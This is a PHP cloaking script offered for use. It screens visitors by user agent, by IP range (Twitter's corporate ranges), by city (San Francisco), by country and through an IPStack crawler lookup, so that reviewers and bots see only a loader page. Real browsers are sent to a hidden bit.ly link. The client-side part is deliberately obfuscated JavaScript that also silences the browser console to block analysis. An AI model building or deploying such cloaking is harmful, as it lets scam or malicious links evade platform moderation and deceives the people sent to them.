<?php

/**
 * Class Cloaker
 * Provides server side checks to see if the visitor is a crawler.
 * Please configure the capitalized settings above the line.
 *
 */
class Cloaker {

	/**
	 * Your redirect url for humans
	 * Create a https://bitly.com url (or similar) and paste the url here.
	 * Example url directs to Shopify home page.
	 *
	 * @var string
	 */
	protected $REDIRECT_URL = 'https://bit.ly/3gDNfri';

	/**
	 * Decide if you want to fully bypass client side javascript checks and rely only on server-side checks.
	 * May be useful if you are confident your server is able to collect all required information and you
	 * do not need to run client side browser tests.
	 * ! Make sure you understand what this means before disabling !
	 *
	 * @var bool
	 */
	protected $BYPASS_CLIENT_SIDE_CHECKS = false;

	/**
	 * Your token to access the IPStack service
	 * Get a free API token from https://ipstack.com
	 * Key will look like '4a1d0dd60fd74723011f280192b1b1d4' (example only).
	 *
	 * @var string
	 */
	protected $IP_STACK_TOKEN = '';

	/**
	 * A list country codes to block.
	 * Example 'PH' for Phillipines, https://en.wikipedia.org/wiki/ISO_3166-1
	 *
	 * @var array
	 */
	protected $BLOCKED_COUNTRY_CODES = ['PH'];

	/**
	 * A list of city names to block.
	 * Use any common city names with care.
	 * Example 'San Francisco'
	 *
	 * @var array
	 */
	protected $BLOCKED_CITY_NAMES = ['San Francisco'];

	/**
	 * A list of corporate IP ranges to block.
	 * Example Twitter https://ipinfo.io/AS35995
	 *
	 * @var array
	 */
	protected $BLOCKED_IP_RANGES = [
		'185.45.4.0/23',
		'185.45.4.0/24',
		'192.133.78.0/23',
		'8.25.194.0/23',
		'8.25.195.0/24',
		'8.25.196.0/23',
		'8.25.196.0/24'
	];

	/**
	 * A list of user-agents to block.
	 * A robust list is provided lower down, but add any additional user agent strings here.
	 * Example 'Twitterbot' (already present in the main list).
	 *
	 * @var array
	 */
	protected $BLOCKED_USER_AGENTS = [
		'Twitterbot'
	];

	/**
	 * If you decide to reobsfucate the client-side javascript, paste the new code here.
	 * Ensure the code is pasted in double "" quotes not single '' quotes.
	 *
	 * @var string
	 */
	protected $OBSFUCATED_JAVASCRIPT = "";

	/*
	 * ==========================================================================
	 * ==== Don't modify below this point unless you know what you are doing ====
	 * ==========================================================================
	 */

	/**
	 * Attribute to flag for blocked results.
	 *
	 * @var bool
	 */
	protected $blocked = false;

	/**
	 * List of errors.
	 *
	 * @var array
	 */
	protected $errors = [];

	/**
	 * Getter for blocked attribute.
	 *
	 * @return bool
	 */
	public function isBlocked() {

		return !!$this->blocked;
	}

	/**
	 * Getter for client-side bypass.
	 *
	 * @return bool
	 */
	public function shouldBypassClientSideChecks() {

		return !!$this->BYPASS_CLIENT_SIDE_CHECKS;
	}

	/**
	 * Getter for error bag.
	 *
	 * @return array
	 */

	public function getErrors() {

		return $this->errors;
	}

	/**
	 * Getter for bitly link url.
	 *
	 * @return string
	 */

	public function getRedirectUrl() {

		return $this->REDIRECT_URL;
	}

	/**
	 * Getter for fresh client-side javascript.
	 *
	 * @return string
	 */

	public function getClientSideJavascript() {

		$javascript = !empty($this->OBSFUCATED_JAVASCRIPT) ? $this->OBSFUCATED_JAVASCRIPT : "var _0x5786=['{}.constructor(\x22return\x20this\x22)(\x20)','Edg','undefined','REDIRECT_URL','addons','toString','chrome','removeChild','[object\x20SafariRemoteNotification]','runtime','table','DOMContentLoaded','test','debug','safari','opera','location','style','StyleMedia','return\x20(function()\x20','CSS','apply','info','\x20OPR/','none','forEach','BLOCKED_USER_AGENTS','exception','error','replace','warn','userAgent','HTMLElement','parentNode','addEventListener','overlay','log','console','documentMode','trace','indexOf','getElementById','webstore'];(function(_0x5cbf48,_0x5786d5){var _0x133a51=function(_0x32abcc){while(--_0x32abcc){_0x5cbf48['push'](_0x5cbf48['shift']());}};_0x133a51(++_0x5786d5);}(_0x5786,0x1e9));var _0x133a=function(_0x5cbf48,_0x5786d5){_0x5cbf48=_0x5cbf48-0x0;var _0x133a51=_0x5786[_0x5cbf48];return _0x133a51;};var _0x5a591d=_0x133a('0x1e');var _0x4520af=_0x133a('0xa');function _0x489b2e(){var _0x90f982=new RegExp(_0x4520af,'i');var _0x4bcf61=navigator[_0x133a('0xf')];return!_0x90f982[_0x133a('0x27')](_0x4bcf61);}function _0x47d5c5(){var _0x1650e7=function(){var _0x1f34fb=!![];return function(_0x200b3b,_0x160f73){var _0x4c57ca=_0x1f34fb?function(){if(_0x160f73){var _0x29fd8a=_0x160f73[_0x133a('0x5')](_0x200b3b,arguments);_0x160f73=null;return _0x29fd8a;}}:function(){};_0x1f34fb=![];return _0x4c57ca;};}();var _0x57cdfc=!!window['opr']&&!!opr[_0x133a('0x1f')]||!!window[_0x133a('0x2a')]||navigator[_0x133a('0xf')][_0x133a('0x18')](_0x133a('0x7'))>=0x0;var _0x1d22de=typeof InstallTrigger!==_0x133a('0x1d');var _0x8e0980=/constructor/i[_0x133a('0x27')](window[_0x133a('0x10')])||function(_0x2f5b18){var _0x2ec891=_0x1650e7(this,function(){var _0x1d695e=function(){};var _0x499453=function(){var _0x23a2a4;try{_0x23a2a4=Function(_0x133a('0x3')+_0x133a('0x1b')+');')();}catch(_0x57655c){_0x23a2a4=window;}return _0x23a2a4;};var _0x500b0f=_0x499453();if(!_0x500b0f[_0x133a('0x15')]){_0x500b0f['console']=function(_0x443ef5){var _0x4532db={};_0x4532db[_0x133a('0x14')]=_0x443ef5;_0x4532db[_0x133a('0xe')]=_0x443ef5;_0x4532db[_0x133a('0x28')]=_0x443ef5;_0x4532db[_0x133a('0x6')]=_0x443ef5;_0x4532db[_0x133a('0xc')]=_0x443ef5;_0x4532db['exception']=_0x443ef5;_0x4532db[_0x133a('0x25')]=_0x443ef5;_0x4532db[_0x133a('0x17')]=_0x443ef5;return _0x4532db;}(_0x1d695e);}else{_0x500b0f[_0x133a('0x15')]['log']=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0xe')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x28')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x6')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0xc')]=_0x1d695e;_0x500b0f['console'][_0x133a('0xb')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x25')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x17')]=_0x1d695e;}});_0x2ec891();return _0x2f5b18[_0x133a('0x20')]()===_0x133a('0x23');}(!window[_0x133a('0x29')]||typeof safari!==_0x133a('0x1d')&&safari['pushNotification']);var _0x295dbe=![]||!!document[_0x133a('0x16')];var _0x27ad47=!_0x295dbe&&!!window[_0x133a('0x2')];var _0x129c73=!!window[_0x133a('0x21')]&&(!!window[_0x133a('0x21')][_0x133a('0x1a')]||!!window[_0x133a('0x21')][_0x133a('0x24')]);var _0x2878e2=_0x129c73&&navigator[_0x133a('0xf')]['indexOf'](_0x133a('0x1c'))!=-0x1;var _0x36890e=(_0x129c73||_0x57cdfc)&&!!window[_0x133a('0x4')];var _0x3e6d53=[_0x57cdfc,_0x1d22de,_0x8e0980,_0x295dbe,_0x27ad47,_0x129c73,_0x2878e2,_0x36890e];var _0x346ca1=![];_0x3e6d53[_0x133a('0x9')](function(_0xd5b2fe){if(_0xd5b2fe){_0x346ca1=!![];}});return _0x346ca1;}if(_0x489b2e()&&_0x47d5c5()){window[_0x133a('0x0')][_0x133a('0xd')](_0x5a591d);}else{document[_0x133a('0x12')](_0x133a('0x26'),function(){var _0x1713f5=document[_0x133a('0x19')](_0x133a('0x13'));_0x1713f5[_0x133a('0x1')]['display']=_0x133a('0x8');_0x1713f5[_0x133a('0x11')][_0x133a('0x22')](_0x1713f5);});}";

		$javascript = str_replace('REDIRECT_URL', $this->getRedirectUrl(), $javascript);
		$javascript = str_replace('BLOCKED_USER_AGENTS', $this->getBlockedUserAgents(), $javascript);

		return $javascript;
	}

	/**
	 * Primary method for running all checks.
	 *
	 * @return bool
	 */
	public function check() {

		if (!$this->blocked && $this->checkUserAgent()) {
			$this->blocked = true;
		}
		if (!$this->blocked && $this->checkIpAddress()) {
			$this->blocked = true;
		}

		return $this->blocked;
	}

	/**
	 * Run check on user agent string.
	 *
	 * @return bool
	 */
	public function checkUserAgent() {

		$search = $this->getBlockedUserAgents();

		return !!(isset($_SERVER['HTTP_USER_AGENT']) && preg_match($search, $_SERVER['HTTP_USER_AGENT']));
	}

	/**
	 * Fetch result from IPStack and check against block lists.
	 * Block lists checked: $BLOCKED_COUNTRY_CODES, $BLOCKED_CITY_NAMES, $BLOCKED_IP_RANGES.
	 * Will also check against IPStacks known pool of crawler IP addresses.
	 *
	 * @return bool
	 */
	public function checkIpAddress() {

		// Ensure IPStack is enabled

		// Get the result from IPStack
		$ip      = $this->getIpAddress();
		$ipstack = $this->getIpStack($ip);
		// Check to see if we got a response
		if ($ipstack && !(isset($ipstack->success) && $ipstack->success === false)) {
			if ($ipstack->security->is_crawler || in_array($ipstack->country_code, $this->BLOCKED_COUNTRY_CODES) || in_array($ipstack->country_code,
					$this->BLOCKED_CITY_NAMES) || $this->ipInRange($ip,
					$this->BLOCKED_IP_RANGES)) {
				return true;
			}
		}

		return false;

	}

	/**
	 * Gets merged list of blocked user agents.
	 *
	 * @return string
	 */
	public function getBlockedUserAgents() {

		$search = '';
		if (count($this->BLOCKED_USER_AGENTS)) {
			$search = implode('|', $this->BLOCKED_USER_AGENTS);
			$search = preg_quote($search) . '|';
		}
		$search = $search . 'googlebot|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis';
		$search = '(' . $search . ')';

		return $search;
	}

	/**
	 * Gets the visitor's IP address to be checked against IPStack.
	 *
	 * @return string
	 */
	protected function getIpAddress() {

		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			$ip = $_SERVER['REMOTE_ADDR'];
		}

		return $ip;
	}

	/**
	 * Fetches a response from the IPStack service.
	 * Must have a valid $IP_STACK_TOKEN and $ip address provided.
	 *
	 * @param $ip
	 *
	 * @return mixed|null
	 */
	protected function getIpStack($ip) {

		if (!empty($this->IP_STACK_TOKEN) && !empty($ip)) {
			try {
				$response = json_decode(file_get_contents(sprintf('http://api.ipstack.com/%s?access_key=%s', $ip, $this->IP_STACK_TOKEN)));

				if ($response && !(isset($response->success) && $response->success === false)) {
					$ipstack = $response;
				}
			}
			catch (Exception $e) {
				$this->errors[] = $e->getMessage();
			}
		}

		return isset($ipstack) ? $ipstack : null;
	}

	/**
	 * Checks the provided IP address against a corporate IP range.
	 *
	 * @param $ip
	 * @param $range
	 *
	 * @return bool
	 */
	protected function ipInRange($ip, $range) {

		if (strpos($range, '/') == false) {
			$range .= '/32';
		}

		// $range is in IP/CIDR format eg 127.0.0.1/24
		list($range, $netmask) = explode('/', $range, 2);

		$ip_decimal       = ip2long($ip);
		$range_decimal    = ip2long($range);
		$wildcard_decimal = pow(2, (32 - $netmask)) - 1;
		$netmask_decimal  = ~$wildcard_decimal;

		return (($ip_decimal & $netmask_decimal) == ($range_decimal & $netmask_decimal));
	}

}

// Create new check instance
$cloaker = new Cloaker();
// Run the checks
$blocked = $cloaker->check();

if ($cloaker->shouldBypassClientSideChecks()) {
	header(sprintf('Location: %s', $cloaker->getRedirectUrl()));
	exit();
}

?>
<?php if (!$blocked) { ?>
	<style type="text/css">
		<?php echo "#loader{height:100%;width:100%;position:fixed;z-index:999;top:0;left:0;background-color:rgb(255,255,255);overflow-x:hidden}.loading{position:absolute;left:50%;top:50%;height:40px;width:40px;margin:0px auto;-webkit-animation:rotation .6s infinite linear;-moz-animation:rotation .6s infinite linear;-o-animation:rotation .6s infinite linear;animation:rotation .6s infinite linear;border-left:6px solid rgba(0,174,239,.15);border-right:6px solid rgba(0,174,239,.15);border-bottom:6px solid rgba(0,174,239,.15);border-top:6px solid rgba(0,174,239,.8);border-radius:100%}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}"; ?>
	</style>
	<script type="text/javascript">
		<?php echo $cloaker->getClientSideJavascript(); ?>
	</script>
<?php } ?>
